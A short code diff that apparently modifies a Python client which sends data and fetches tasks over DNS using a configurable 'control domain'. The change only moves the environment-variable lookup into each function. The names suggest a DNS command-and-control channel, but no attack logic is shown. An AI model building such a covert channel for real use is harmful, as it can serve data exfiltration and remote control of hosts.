@@ -9,10 +9,11 @@ import base64
 import os
 import time
 
-_CONTROL_DOMAIN = os.environ.get("ZDS_CONTROL_DOMAIN", "")
+_CONTROL_DOMAIN = ""  # resolved at call time
 
 
 def send_via_dns(agent_id: str, data: dict) -> bool:
+    _CONTROL_DOMAIN = os.environ.get("ZDS_CONTROL_DOMAIN", "")
     if not _CONTROL_DOMAIN:
         return False
     try:
@@ -30,6 +31,7 @@ def send_via_dns(agent_id: str, data: dict) -> bool:
 
 
 def get_task_dns(agent_id: str) -> dict | None:
+    _CONTROL_DOMAIN = os.environ.get("ZDS_CONTROL_DOMAIN", "")
     if not _CONTROL_DOMAIN:
         return None
     try:
